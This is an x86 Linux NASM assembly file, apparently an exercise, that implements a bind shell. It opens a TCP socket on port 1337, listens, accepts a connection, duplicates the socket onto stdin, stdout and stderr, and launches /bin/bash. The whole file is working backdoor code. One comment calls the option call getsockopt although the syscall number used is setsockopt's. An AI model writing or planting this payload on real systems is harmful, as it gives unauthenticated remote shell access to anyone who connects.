;; vim: ft=nasm

; sockaddr_in {{{
struc sockaddr_in
  .sin_family: resw 1
  .sin_port:   resw 1
  .sin_addr:   resd 1
  .sin_zero:   resb 8
  .size:
endstruc
; }}}

	mov ebp, esp
	sub esp, 8 ;; two values: two sockfd

	push word 0x3905
	;; socket new bind
	mov ebp, esp

	;; sys_socket arguments:
	push 0 ;; IPPROTO_IP = 0 (int)
	push 1 ;; SOCK_STREAM = 1 (int)
	push 2 ;; AF_INET = 2 (int)

	mov eax, 0x66 ;; sys_socketcall
	mov ebx, 1    ;; sys_socket
	mov ecx, esp  ;; function args
	int 0x80
	;; value returned from syscall is in eax
	;; save it for later
	mov edx, eax

	mov esp, ebp

	;; set sock_reuseaddr to avoid some segfaults when socket is not
	;; ready
	push 1   ;; value to be set: True
	mov eax, esp ;; remember the place of the value we put
	push 4   ;; sizeof bool
	push eax ;; address of socklen_t - on the stack
	push 2   ;; optname: SO_REUSEADDR = 2
	push 1   ;; SOL_SOCKET = 1
	push edx ;; sockfd

	mov eax, 0x66 ;; sys_socketcall
	mov ebx, 14    ;; sys_getsockopt
	mov ecx, esp  ;; function args
	int 0x80

	mov esp, ebp

	;; bind the socket with the address type

	;; build the sockaddr_in type
	sub esp, sockaddr_in.size
	mov [esp + sockaddr_in.sin_addr], dword 0
	mov [esp + sockaddr_in.sin_port], word 0x3905
	mov [esp + sockaddr_in.sin_family], word 2
	mov [esp + sockaddr_in.sin_zero], dword 0
	mov [esp + sockaddr_in.sin_zero + 4], dword 0
	mov esi, esp     ;; save the struct pointer
	;; arguments for bind
	push sockaddr_in.size
	push esi ;; sockaddr_in struct pointer
	push edx ;; socket fd

	mov eax, 0x66 ;; sys_socketcall
	mov ebx, 2    ;; sys_bind
	mov ecx, esp  ;; function args
	int 0x80

	mov esp, ebp

	;; turn the socket into a listening socket

	push 0   ;; queue size
	push edx ;; socket fd

	mov eax, 0x66 ;; sys_socketcall
	mov ebx, 4    ;; sys_listen
	mov ecx, esp  ;; function args
	int 0x80

	mov esp, ebp
	;; end of creation

	;; accept

	;; call sys_accept
	push 0   ;; structure length
	push 0   ;; no structure (of length above)
	push edx ;; sockfd

	mov eax, 0x66 ;; sys_socketcall
	mov ebx, 5    ;; sys_accept
	mov ecx, esp  ;; function args
	int 0x80
	;; return val is in eax
	mov [ebp-8], eax

	mov esp, ebp
	;; end of accept

	;; overwrite stdin, stdout and stderr with sockfd
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 0       ;; stdin
	int 0x80
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 1       ;; stdout
	int 0x80
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 2       ;; stderr
	int 0x80
	;; call bash with streams overwritten above
	sub esp, 12
	mov [esp], dword 0x6e69622f
	mov [esp + 4], dword 0x7361622f
	mov [esp + 8], dword 0x00000068
	mov eax, 0xb
	mov ebx, esp
	mov ecx, 0
	mov edx, 0
	int 0x80
